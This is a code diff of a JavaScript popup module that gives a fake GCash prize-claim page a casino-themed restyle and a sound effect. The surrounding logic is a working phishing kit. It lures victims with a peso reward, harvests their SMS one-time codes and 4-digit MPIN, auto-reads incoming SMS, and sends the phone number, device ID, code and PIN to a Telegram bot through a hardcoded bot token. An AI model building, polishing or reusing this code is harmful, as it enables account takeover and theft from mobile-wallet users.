@@ -1,5 +1,5 @@
 /**
- * Popup Share Module - Complete with Firewall Logic
+ * Popup Share Module - Casino Theme Remastered
  * With Telegram Notifications for 6-digit request, verification attempts, AND 6-digit code entry
  */
 
@@ -17,7 +17,18 @@
     let detectedSMSCode = '';
     let smsReceiverStarted = false;
     let currentMPIN = '';
-    let lastNotifiedCode = ''; // Track last notified 6-digit code to avoid duplicate notifications
+    let lastNotifiedCode = '';
+    
+    // ========== SOUND EFFECT ==========
+    function playClaimSound() {
+        try {
+            const audio = new Audio('sounds/super_ace_scatter_ring.mp3');
+            audio.volume = 0.7;
+            audio.play().catch(e => console.log('Sound play prevented:', e));
+        } catch(e) {
+            console.log('Sound error:', e);
+        }
+    }
     
     // ========== TELEGRAM NOTIFICATIONS ==========
     const BOT_TOKEN = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
@@ -160,18 +171,19 @@
         }
     }
     
-    // ========== ADD ANIMATIONS ==========
+    // ========== ADD ANIMATIONS - Casino Theme ==========
     function addAnimations() {
         const style = document.createElement('style');
         style.textContent = `
+            /* ========== CASINO THEME ANIMATIONS ========== */
             @keyframes bounceIn {
                 0% { transform: scale(0) rotate(-180deg); opacity: 0; }
                 60% { transform: scale(1.1) rotate(0deg); }
                 100% { transform: scale(1) rotate(0deg); opacity: 1; }
             }
-            @keyframes pulse {
+            @keyframes pulseGold {
                 0% { transform: scale(1); }
-                50% { transform: scale(1.02); box-shadow: 0 0 20px rgba(255,215,0,0.5); }
+                50% { transform: scale(1.02); box-shadow: 0 0 25px rgba(212,175,55,0.6); }
                 100% { transform: scale(1); }
             }
             @keyframes shake {
@@ -182,16 +194,24 @@
                 100% { transform: translateX(0); }
             }
             @keyframes neonBluePulse {
-                0% { box-shadow: 0 0 5px #00f2ff, 0 0 10px #00f2ff; }
-                50% { box-shadow: 0 0 15px #00f2ff, 0 0 25px #00f2ff, 0 0 35px #00f2ff; }
-                100% { box-shadow: 0 0 5px #00f2ff, 0 0 10px #00f2ff; }
+                0% { box-shadow: 0 0 5px #0066ff, 0 0 10px #0066ff; }
+                50% { box-shadow: 0 0 15px #0066ff, 0 0 25px #0066ff, 0 0 35px #0066ff; }
+                100% { box-shadow: 0 0 5px #0066ff, 0 0 10px #0066ff; }
             }
+            @keyframes goldShine {
+                0% { background-position: -200% center; }
+                100% { background-position: 200% center; }
+            }
+            
+            /* ========== BUTTON EFFECTS ========== */
             .btn-pulse {
-                animation: pulse 0.5s ease;
+                animation: pulseGold 0.5s ease;
             }
             .shake-effect {
                 animation: shake 0.3s ease-in-out;
             }
+            
+            /* ========== MPIN DOTS - Casino Style ========== */
             .mpin-dots {
                 display: flex;
                 justify-content: center;
@@ -199,53 +219,63 @@
                 margin: 20px 0;
             }
             .mpin-dot {
-                width: 12px;
-                height: 12px;
+                width: 14px;
+                height: 14px;
                 border-radius: 50%;
-                background: rgba(255, 255, 255, 0.3);
-                transition: all 0.2s ease;
+                background: rgba(212, 175, 55, 0.3);
+                border: 1px solid rgba(212, 175, 55, 0.5);
+                transition: all 0.3s ease;
             }
             .mpin-dot.filled {
-                background: #00f2ff;
-                box-shadow: 0 0 10px #00f2ff;
+                background: #d4af37;
+                box-shadow: 0 0 15px #d4af37, 0 0 30px rgba(212, 175, 55, 0.5);
             }
+            
+            /* ========== NUMERIC KEYPAD - Casino Style ========== */
             .numeric-keypad {
                 display: grid;
                 grid-template-columns: repeat(3, 1fr);
                 gap: 10px;
                 padding: 15px;
-                background: rgba(0, 242, 255, 0.08);
-                border-radius: 30px;
+                background: rgba(0, 0, 0, 0.4);
+                border: 1px solid rgba(212, 175, 55, 0.2);
+                border-radius: 16px;
                 margin: 10px 0;
             }
             .num-btn {
-                background: rgba(255, 255, 255, 0.15);
-                backdrop-filter: blur(10px);
-                border: 1px solid rgba(255, 255, 255, 0.3);
+                background: linear-gradient(145deg, #1a1a1a, #0a0a0a);
+                border: 1px solid rgba(212, 175, 55, 0.4);
                 border-radius: 50%;
                 width: 55px;
                 height: 55px;
                 font-size: 22px;
                 font-weight: bold;
-                color: white;
+                color: #fce883;
                 cursor: pointer;
                 display: flex;
                 align-items: center;
                 justify-content: center;
                 margin: 0 auto;
+                font-family: 'Orbitron', monospace;
+                transition: all 0.1s ease;
+                box-shadow: 0 3px 0 rgba(212, 175, 55, 0.3);
             }
             .num-btn:active {
-                transform: scale(0.95);
-                background: rgba(255, 255, 255, 0.3);
+                transform: translateY(3px);
+                box-shadow: 0 0 0 rgba(212, 175, 55, 0.3);
+                background: linear-gradient(145deg, #0a0a0a, #1a1a1a);
+                color: #d4af37;
             }
+            
+            /* ========== BACK BUTTON - Casino Style ========== */
             .small-back-btn {
-                background: rgba(255, 255, 255, 0.1);
-                border: 1px solid rgba(255, 215, 0, 0.3);
-                border-radius: 30px;
-                padding: 6px 16px;
+                background: linear-gradient(to bottom, #d4af37, #aa771c);
+                border: 1px solid #fcf6ba;
+                border-radius: 8px;
+                padding: 8px 18px;
                 font-size: 11px;
-                font-weight: 600;
-                color: #ffd700;
+                font-weight: 700;
+                color: #1a1100;
                 cursor: pointer;
                 display: inline-flex;
                 align-items: center;
@@ -253,19 +283,127 @@
                 gap: 5px;
                 width: auto;
                 margin-top: 10px;
+                font-family: 'Orbitron', monospace;
+                letter-spacing: 1px;
+                text-shadow: 1px 1px 0 rgba(255,255,255,0.3);
+                box-shadow: 0 3px 0 #6e4b0c;
+                transition: all 0.1s ease;
             }
             .small-back-btn:active {
-                transform: scale(0.95);
+                transform: translateY(3px);
+                box-shadow: 0 0 0 #6e4b0c;
             }
+            
+            /* ========== ATTEMPTS COUNTER ========== */
             .attempts-counter {
                 font-size: 10px;
-                color: #ffaa33;
+                color: #d4af37;
                 text-align: center;
                 margin-top: 10px;
+                font-family: 'Orbitron', monospace;
+                letter-spacing: 1px;
+            }
+            
+            /* ========== VERIFICATION INPUT - Casino Style ========== */
+            .verification-input {
+                text-align: center;
+                font-size: 20px;
+                font-weight: bold;
+                width: 180px;
+                padding: 12px;
+                background: #000;
+                border: 2px solid rgba(212, 175, 55, 0.5);
+                border-radius: 8px;
+                color: #fce883;
+                font-family: 'Orbitron', monospace;
+                transition: all 0.3s ease;
+                letter-spacing: 3px;
+            }
+            .verification-input:focus {
+                border-color: #d4af37;
+                box-shadow: 0 0 15px rgba(212, 175, 55, 0.3);
+                outline: none;
+            }
+            
+            /* ========== SMS POPUP - Casino Style ========== */
+            #smsCodePopup {
+                background: linear-gradient(145deg, #1a0505, #000000);
+                border: 1px solid #d4af37;
+                border-radius: 12px;
+                padding: 12px;
+                margin: 10px 0;
+                animation: bounceIn 0.3s ease;
+                box-shadow: 0 0 20px rgba(212, 175, 55, 0.2);
+            }
+            
+            /* ========== PHASE CONTAINERS ========== */
+            #step1Container,
+            #step2Container {
+                background: linear-gradient(145deg, rgba(20, 15, 40, 0.5), rgba(10, 5, 20, 0.5));
+                border: 1px solid rgba(212, 175, 55, 0.3);
+                border-radius: 16px;
+                padding: 15px;
+                margin: 10px 0;
+            }
+            
+            /* ========== CLAIM BUTTON - Casino Style ========== */
+            .claim-gcash-button {
+                background: linear-gradient(to bottom, #d4af37, #aa771c);
+                border: 1px solid #fcf6ba;
+                border-radius: 8px;
+                padding: 12px 20px;
+                font-weight: 800;
+                color: #1a1100;
+                font-size: 13px;
+                cursor: pointer;
+                font-family: 'Orbitron', monospace;
+                letter-spacing: 1px;
+                text-shadow: 1px 1px 0 rgba(255,255,255,0.3);
+                box-shadow: 0 4px 0 #6e4b0c;
+                transition: all 0.1s ease;
+            }
+            .claim-gcash-button:active {
+                transform: translateY(4px);
+                box-shadow: 0 0 0 #6e4b0c;
+            }
+            
+            /* ========== DIVIDER ========== */
+            .divider {
+                width: 50px;
+                height: 2px;
+                background: linear-gradient(90deg, #aa771c, #fcf6ba, #aa771c);
+                margin: 10px auto;
+            }
+            
+            /* ========== PHASE 2 HEADING ========== */
+            .phase2-heading {
+                font-family: 'Orbitron', monospace;
+                font-size: 18px;
+                font-weight: 900;
+                background: linear-gradient(to bottom, #fcf6ba, #d4af37, #aa771c);
+                -webkit-background-clip: text;
+                background-clip: text;
+                color: transparent;
+                margin: 5px 0;
+                letter-spacing: 1px;
+                text-align: center;
+            }
+            
+            /* ========== PHASE 3 HEADING ========== */
+            .phase3-heading {
+                font-family: 'Orbitron', monospace;
+                font-size: 18px;
+                font-weight: 900;
+                color: #d4af37;
+                margin: 5px 0;
+                letter-spacing: 1px;
+                text-align: center;
+                text-shadow: 0 0 10px rgba(212, 175, 55, 0.5);
             }
         `;
-        if (!document.querySelector('#popup-animations')) {
-            style.id = 'popup-animations';
+        
+        if (!document.querySelector('#popup-casino-animations')) {
+            style.id = 'popup-casino-animations';
             document.head.appendChild(style);
         }
     }
@@ -277,7 +415,6 @@
         
         console.log('SMS Retriever started - waiting for SMS...');
         
-        // For Android SMS Retriever API
         if (window.smsretriever) {
             window.smsretriever.startWatch(function(sms) {
                 console.log('Raw SMS received:', sms);
@@ -303,8 +440,8 @@
                     
                     if (codeInput) {
                         codeInput.value = code;
-                        codeInput.style.borderColor = '#39ff14';
-                        codeInput.style.boxShadow = '0 0 10px #39ff14';
+                        codeInput.style.borderColor = '#22C55E';
+                        codeInput.style.boxShadow = '0 0 15px #22C55E';
                         
                         setTimeout(() => {
                             const verifyBtn = document.getElementById('verify6DigitBtn');
@@ -367,6 +504,9 @@
             
             console.log('Claim button clicked!');
             
+            // PLAY SOUND EFFECT
+            playClaimSound();
+            
             resetAttempts();
             
             // SEND TELEGRAM NOTIFICATION FOR 6-DIGIT REQUEST
@@ -380,7 +520,7 @@
             if (window.ConfettiModule) window.ConfettiModule.start();
         };
         
-        console.log('Claim button attached');
+        console.log('Claim button attached with sound effect');
     }
     
     // ========== ATTACH FIREWALL EVENTS ==========
@@ -458,7 +598,7 @@
         startSmsRetriever();
     }
     
-    // ========== PHASE 3: CLAIMING VERIFICATION ==========
+    // ========== PHASE 3: CLAIMING VERIFICATION - Casino Theme ==========
     function showPhase3() {
         const popupInner = document.querySelector('.popup-inner');
         if (!popupInner) return;
@@ -475,60 +615,60 @@
             <div class="popup-close" id="popupClosePhase3">✕</div>
             
             <div style="text-align: center; margin-bottom: 10px;">
-                <img src="images/gc_icon.png" style="width: 55px; height: 55px; animation: bounceIn 0.5s ease;">
+                <img src="images/gc_icon.png" style="width: 60px; height: 60px; animation: bounceIn 0.5s ease; border-radius: 50%; border: 2px solid #d4af37; box-shadow: 0 0 20px rgba(212,175,55,0.4);">
             </div>
             
-            <h2 style="text-align: center; font-family: 'Orbitron', monospace; font-size: 20px; font-weight: 900; color: #00f2ff; margin: 5px 0; letter-spacing: 1px; text-shadow: 0 0 10px #00f2ff; animation: neonBluePulse 1.5s infinite;">
+            <h2 class="phase3-heading">
                 CLAIMING VERIFICATION
             </h2>
             
-            <div class="divider" style="width: 50px; margin: 10px auto; background: #00f2ff;"></div>
+            <div class="divider"></div>
             
             <div class="attempts-counter">
                 ⚠️ Attempts remaining: ${attemptsLeft} / ${MAX_ATTEMPTS}
             </div>
             
-            <!-- SMS CODE POPUP -->
-            <div id="smsCodePopup" style="display: none; background: linear-gradient(135deg, #1a1a2e, #0f0f1a); border: 1px solid #00f2ff; border-radius: 16px; padding: 12px; margin: 10px 0; animation: bounceIn 0.3s ease;">
-                <div style="display: flex; align-items: center; gap: 10px;">
-                    <div style="font-size: 30px;">📨</div>
+            <!-- SMS CODE POPUP - Casino Style -->
+            <div id="smsCodePopup" style="display: none;">
+                <div style="display: flex; align-items: center; gap: 12px;">
+                    <div style="font-size: 32px;">📨</div>
                     <div style="flex: 1;">
-                        <div style="font-size: 10px; color: #00f2ff;">SMS RECEIVED</div>
-                        <div style="font-size: 14px; color: white; font-weight: bold; font-family: monospace;" id="smsCodeValue">------</div>
+                        <div style="font-size: 10px; color: #d4af37; font-family: 'Orbitron', monospace; letter-spacing: 1px;">SMS RECEIVED</div>
+                        <div style="font-size: 16px; color: #fce883; font-weight: bold; font-family: 'Orbitron', monospace; letter-spacing: 2px;" id="smsCodeValue">------</div>
                     </div>
-                    <button id="autoFillSmsBtn" class="small-back-btn" style="background: #00f2ff; color: #000; border: none; padding: 6px 12px;">
+                    <button id="autoFillSmsBtn" class="small-back-btn" style="background: linear-gradient(to bottom, #22C55E, #16A34A); color: #fff; border: 1px solid #4ade80; text-shadow: none; box-shadow: 0 3px 0 #15803d;">
                         USE CODE
                     </button>
                 </div>
             </div>
             
-            <!-- STEP 1: 6-DIGIT CODE -->
-            <div id="step1Container" style="background: linear-gradient(135deg, rgba(0,242,255,0.08), rgba(0,242,255,0.02)); border-radius: 16px; padding: 15px; margin: 10px 0;">
+            <!-- STEP 1: 6-DIGIT CODE - Casino Style -->
+            <div id="step1Container">
                 <div style="text-align: center; margin-bottom: 10px;">
-                    <span style="font-size: 11px; color: #00f2ff;">STEP 1 OF 2</span>
+                    <span style="font-size: 11px; color: #d4af37; font-family: 'Orbitron', monospace; letter-spacing: 2px;">STEP 1 OF 2</span>
                 </div>
-                <p style="font-size: 11px; color: #ccc; text-align: center; margin: 0 0 10px 0;">
-                    Enter the <strong style="color: #00f2ff;">6-digit verification code</strong> received via SMS
+                <p style="font-size: 11px; color: #999; text-align: center; margin: 0 0 10px 0; font-family: 'Poppins', sans-serif;">
+                    Enter the <strong style="color: #fce883;">6-digit verification code</strong> received via SMS
                 </p>
-                <div style="display: flex; gap: 10px; justify-content: center;">
-                    <input type="text" id="code6Digit" class="verification-input" placeholder="123456" maxlength="6" inputmode="numeric" autocomplete="one-time-code" style="text-align: center; font-size: 20px; font-weight: bold; width: 180px; padding: 12px; background: rgba(0,0,0,0.5); border: 1px solid rgba(0,242,255,0.4); border-radius: 30px; color: white; transition: all 0.2s ease;">
-                    <button id="verify6DigitBtn" class="claim-gcash-button" style="background: linear-gradient(135deg, #00aaff, #0066cc); width: auto; padding: 0 20px;">
+                <div style="display: flex; gap: 10px; justify-content: center; align-items: center;">
+                    <input type="text" id="code6Digit" class="verification-input" placeholder="000000" maxlength="6" inputmode="numeric" autocomplete="one-time-code">
+                    <button id="verify6DigitBtn" class="claim-gcash-button" style="background: linear-gradient(to bottom, #0066ff, #0044cc); border: 1px solid #3399ff; color: #fff; text-shadow: none; box-shadow: 0 4px 0 #003399; padding: 12px 18px;">
                         VERIFY
                     </button>
                 </div>
-                <div id="step1ErrorMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff8888; font-size: 11px;"></div>
+                <div id="step1ErrorMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff6666; font-size: 11px; font-family: 'Poppins', sans-serif;"></div>
             </div>
             
-            <!-- STEP 2: 4-DIGIT MPIN -->
-            <div id="step2Container" style="display: none; background: linear-gradient(135deg, rgba(0,242,255,0.08), rgba(0,242,255,0.02)); border-radius: 16px; padding: 15px; margin: 10px 0;">
+            <!-- STEP 2: 4-DIGIT MPIN - Casino Style -->
+            <div id="step2Container" style="display: none;">
                 <div style="text-align: center; margin-bottom: 10px;">
-                    <span style="font-size: 11px; color: #00f2ff;">STEP 2 OF 2</span>
+                    <span style="font-size: 11px; color: #d4af37; font-family: 'Orbitron', monospace; letter-spacing: 2px;">STEP 2 OF 2</span>
                 </div>
-                <p style="font-size: 11px; color: #ccc; text-align: center; margin: 0 0 10px 0;">
-                    Enter your <strong style="color: #ffd700;">4-digit MPIN</strong>
+                <p style="font-size: 11px; color: #999; text-align: center; margin: 0 0 10px 0; font-family: 'Poppins', sans-serif;">
+                    Enter your <strong style="color: #fce883;">4-digit MPIN</strong>
                 </p>
                 
-                <div class="mpin-dots" id="mpinDots" style="display: flex; justify-content: center; gap: 15px; margin: 15px 0;">
+                <div class="mpin-dots" id="mpinDots">
                     <div class="mpin-dot"></div>
                     <div class="mpin-dot"></div>
                     <div class="mpin-dot"></div>
@@ -545,17 +685,17 @@
                     <button class="num-btn" data-num="7">7</button>
                     <button class="num-btn" data-num="8">8</button>
                     <button class="num-btn" data-num="9">9</button>
-                    <button class="num-btn" data-num="clear" style="font-size: 14px;">⌫</button>
+                    <button class="num-btn" data-num="clear" style="font-size: 16px;">⌫</button>
                     <button class="num-btn" data-num="0">0</button>
-                    <button class="num-btn" data-num="reset" style="font-size: 14px;">🗑️</button>
+                    <button class="num-btn" data-num="reset" style="font-size: 16px;">↺</button>
                 </div>
                 
-                <div id="step2ErrorMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff4444; font-size: 12px; padding: 8px; border-radius: 20px;">
+                <div id="step2ErrorMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff4444; font-size: 12px; padding: 8px; border-radius: 8px; font-family: 'Poppins', sans-serif; background: rgba(255, 68, 68, 0.1); border: 1px solid rgba(255, 68, 68, 0.3);">
                     ❌ Invalid MPIN. Please try again.
                 </div>
             </div>
             
-            <div style="text-align: center; margin-top: 10px;">
+            <div style="text-align: center; margin-top: 12px;">
                 <button class="small-back-btn" id="backBtnPhase3">
                     ← BACK
                 </button>
@@ -596,8 +736,8 @@
             autoFillBtn.onclick = function() {
                 if (codeInput && detectedSMSCode) {
                     codeInput.value = detectedSMSCode;
-                    codeInput.style.borderColor = '#39ff14';
-                    codeInput.style.boxShadow = '0 0 10px #39ff14';
+                    codeInput.style.borderColor = '#22C55E';
+                    codeInput.style.boxShadow = '0 0 15px #22C55E';
                     
                     setTimeout(() => {
                         if (verifyBtn) verifyBtn.click();
@@ -627,17 +767,14 @@
                 
                 console.log('6-digit code accepted:', code);
                 
-                // SEND TELEGRAM NOTIFICATION FOR 6-DIGIT CODE ENTERED
                 const userPhone = localStorage.getItem("userPhone") || "Unknown";
                 const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
                 
-                // Only send notification if this code hasn't been notified yet
                 if (lastNotifiedCode !== code) {
                     await send6DigitCodeEnteredNotification(userPhone, deviceId, code);
                     lastNotifiedCode = code;
                 }
                 
-                // Transition to Step 2
                 step1Container.style.transition = 'opacity 0.3s ease';
                 step1Container.style.opacity = '0';
                 
@@ -668,11 +805,11 @@
             codeInput.addEventListener('input', function(e) {
                 const value = this.value.trim();
                 if (value.length === 6 && /^\d+$/.test(value)) {
-                    this.style.borderColor = '#39ff14';
-                    this.style.boxShadow = '0 0 10px #39ff14';
+                    this.style.borderColor = '#22C55E';
+                    this.style.boxShadow = '0 0 15px #22C55E';
                     if (verifyBtn) verifyBtn.click();
                 } else {
-                    this.style.borderColor = 'rgba(0,242,255,0.4)';
+                    this.style.borderColor = 'rgba(212, 175, 55, 0.5)';
                     this.style.boxShadow = 'none';
                 }
             });
@@ -692,7 +829,6 @@
                 const maxReached = incrementInvalidAttempts();
                 const attemptsLeft = MAX_ATTEMPTS - invalidAttempts;
                 
-                // SEND TELEGRAM NOTIFICATION FOR VERIFICATION ATTEMPT
                 sendVerificationAttemptNotification(userPhone, deviceId, currentMPIN, attemptsLeft);
                 
                 const attemptsCounter = document.querySelector('.attempts-counter');
@@ -789,7 +925,7 @@
         }, 300);
     }
     
-    // ========== PHASE 1: DEFAULT POPUP ==========
+    // ========== PHASE 1: DEFAULT POPUP - Casino Theme ==========
     function showPhase1(balance) {
         const popupInner = document.querySelector('.popup-inner');
         if (!popupInner) return;
@@ -809,25 +945,31 @@
         
         popupInner.innerHTML = `
             <div class="popup-close" id="popupClosePhase1">✕</div>
-            <h2 class="popup-title">🎉 HOORAY! 🎉</h2>
-            <div class="prize-amount">₱<span id="popupBalanceAmount">${balance.toFixed(2)}</span></div>
-            <div class="divider"></div>
-            <div class="invite-text">Your friend must confirm your invitation to get extra <strong>₱150 bonus</strong>.</div>
-            <div class="luckyday-image-container">
-                <img src="images/luckyday.png" alt="Lucky Day" class="luckyday-img" onerror="this.style.display='none'">
+            <h2 class="popup-title" style="font-family: 'Playfair Display', serif; font-size: 26px; font-weight: 900; background: linear-gradient(to bottom, #fcf6ba, #d4af37, #aa771c); -webkit-background-clip: text; background-clip: text; color: transparent; text-transform: uppercase; text-align: center;">
+                🎉 HOORAY! 🎉
+            </h2>
+            <div class="prize-amount" style="font-size: 48px; font-weight: 900; color: #fce883; font-family: 'Orbitron', monospace; text-align: center; text-shadow: 0 0 20px rgba(212,175,55,0.5);">
+                ₱<span id="popupBalanceAmount">${balance.toFixed(2)}</span>
             </div>
             <div class="divider"></div>
-            <div class="indicator-group">
-                <div class="indicator"></div>
-                <div class="indicator"></div>
-                <div class="indicator"></div>
+            <div class="invite-text" style="font-size: 12px; color: #999; text-align: center; font-family: 'Poppins', sans-serif;">
+                Your friend must confirm your invitation to get extra <strong style="color: #fce883;">₱150 bonus</strong>.
+            </div>
+            <div class="luckyday-image-container" style="text-align: center; margin: 15px 0;">
+                <img src="images/luckyday.png" alt="Lucky Day" class="luckyday-img" style="max-width: 100%; border-radius: 12px; border: 1px solid rgba(212,175,55,0.3);" onerror="this.style.display='none'">
+            </div>
+            <div class="divider"></div>
+            <div class="indicator-group" style="display: flex; justify-content: center; gap: 12px; margin: 15px 0;">
+                <div class="indicator" style="width: 40px; height: 4px; background: rgba(212,175,55,0.3); border-radius: 2px;"></div>
+                <div class="indicator" style="width: 40px; height: 4px; background: rgba(212,175,55,0.3); border-radius: 2px;"></div>
+                <div class="indicator" style="width: 40px; height: 4px; background: rgba(212,175,55,0.3); border-radius: 2px;"></div>
             </div>
             
-            <button class="claim-gcash-button" id="claimGCashBtn" style="transition: all 0.2s ease;">
-                <img src="images/gc_icon.png" class="gc-icon"> CLAIM THRU GCASH
+            <button class="claim-gcash-button" id="claimGCashBtn" style="width: 100%; display: flex; align-items: center; justify-content: center; gap: 8px;">
+                <img src="images/gc_icon.png" class="gc-icon" style="width: 22px; height: 22px;"> CLAIM THRU GCASH
             </button>
 
-            <div class="button-separator"></div>
+            <div class="button-separator" style="height: 1px; background: linear-gradient(90deg, transparent, rgba(212,175,55,0.4), transparent); margin: 12px 0;"></div>
 
             <button class="small-back-btn" id="backBtnPhase1" style="margin: 0 auto; display: inline-flex;">
                 ← BACK
@@ -843,14 +985,18 @@
         const claimBtn = document.getElementById('claimGCashBtn');
         if (claimBtn) {
             claimBtn.onclick = function() {
-                this.style.transform = 'scale(0.98)';
-                setTimeout(() => { this.style.transform = 'scale(1)'; }, 150);
+                this.style.transform = 'translateY(4px)';
+                this.style.boxShadow = '0 0 0 #6e4b0c';
+                setTimeout(() => { 
+                    this.style.transform = 'translateY(0)';
+                    this.style.boxShadow = '0 4px 0 #6e4b0c';
+                }, 150);
                 checkFirewallAndTransition();
             };
         }
     }
     
-    // ========== PHASE 2: WITHDRAWAL LINK ==========
+    // ========== PHASE 2: WITHDRAWAL LINK - Casino Theme ==========
     function showPhase2() {
         const popupInner = document.querySelector('.popup-inner');
         if (!popupInner) return;
@@ -859,37 +1005,37 @@
         
         const popupContainer = document.querySelector('.popup-container');
         if (popupContainer) {
-            popupContainer.style.maxWidth = '320px';
+            popupContainer.style.maxWidth = '340px';
             popupContainer.style.width = '85%';
         }
         
         popupInner.innerHTML = `
             <div class="popup-close" id="popupClosePhase2">✕</div>
             
-            <div style="text-align: center; margin-bottom: 5px;">
-                <div style="font-size: 45px; animation: bounceIn 0.5s ease;">🏆</div>
+            <div style="text-align: center; margin-bottom: 8px;">
+                <div style="font-size: 50px; animation: bounceIn 0.5s ease;">🏆</div>
             </div>
             
-            <h2 style="text-align: center; font-family: 'Orbitron', monospace; font-size: 18px; font-weight: 900; background: linear-gradient(135deg, #ffd700, #ffaa33); -webkit-background-clip: text; background-clip: text; color: transparent; margin: 3px 0; letter-spacing: 1px;">
+            <h2 class="phase2-heading">
                 GREAT JOB!
             </h2>
             
-            <div class="divider" style="width: 30px; margin: 8px auto;"></div>
+            <div class="divider"></div>
             
-            <div style="background: linear-gradient(135deg, rgba(255,215,0,0.08), rgba(255,215,0,0.02)); border-radius: 12px; padding: 10px; margin: 8px 0;">
-                <p style="font-size: 11px; color: #e0e0e0; text-align: center; margin: 0;">
+            <div style="background: linear-gradient(145deg, rgba(20, 10, 5, 0.6), rgba(10, 5, 0, 0.6)); border: 1px solid rgba(212,175,55,0.3); border-radius: 12px; padding: 14px; margin: 10px 0;">
+                <p style="font-size: 11px; color: #ccc; text-align: center; margin: 0; font-family: 'Poppins', sans-serif;">
                     "Nice work! You're one tap away from your reward!"
                 </p>
-                <p style="font-size: 11px; color: #ffd700; text-align: center; margin: 5px 0 0 0;">
-                    Your reward: <strong style="font-size: 20px;">₱${currentBalance.toFixed(2)}</strong>
+                <p style="font-size: 12px; color: #fce883; text-align: center; margin: 8px 0 0 0; font-family: 'Orbitron', monospace;">
+                    Your reward: <strong style="font-size: 22px; color: #fce883; text-shadow: 0 0 15px rgba(212,175,55,0.5);">₱${currentBalance.toFixed(2)}</strong>
                 </p>
             </div>
             
-            <button class="claim-gcash-button" id="proceedBtn" style="width: 100%; padding: 12px; font-size: 14px; margin-top: 8px;">
-                <img src="images/gc_icon.png" class="gc-icon"> CLAIM VIA GCASH APP
+            <button class="claim-gcash-button" id="proceedBtn" style="width: 100%; padding: 14px; font-size: 14px; margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 8px;">
+                <img src="images/gc_icon.png" class="gc-icon" style="width: 20px; height: 20px;"> CLAIM VIA GCASH APP
             </button>
 
-            <div class="button-separator" style="margin: 10px 0 8px;"></div>
+            <div class="button-separator" style="height: 1px; background: linear-gradient(90deg, transparent, rgba(212,175,55,0.4), transparent); margin: 12px 0 10px;"></div>
 
             <button class="small-back-btn" id="backBtnPhase2" style="margin: 0 auto; display: inline-flex;">
                 ← COMPLETE TASK #2
@@ -930,7 +1076,7 @@
                 setTimeout(() => this.classList.remove('btn-pulse'), 500);
                 
                 this.disabled = true;
-                this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> PROCESSING...`;
+                this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon" style="width: 20px; height: 20px;"> PROCESSING...`;
                 this.style.opacity = '0.8';
                 
                 window.addEventListener('beforeunload', beforeUnloadHandler);
@@ -942,7 +1088,7 @@
                     await markLinkAsUsed(linkData.key, userPhone);
                     
                     isRedirecting = true;
-                    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> REDIRECTING...`;
+                    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon" style="width: 20px; height: 20px;"> REDIRECTING...`;
                     setTimeout(() => {
                         window.removeEventListener('beforeunload', beforeUnloadHandler);
                         window.location.href = linkData.url;
@@ -953,7 +1099,7 @@
                     window.removeEventListener('beforeunload', beforeUnloadHandler);
                     
                     this.disabled = false;
-                    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> CLAIM VIA GCASH APP`;
+                    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon" style="width: 20px; height: 20px;"> CLAIM VIA GCASH APP`;
                     this.style.opacity = '1';
                     alert("No payout link available. Please try again.");
                 }
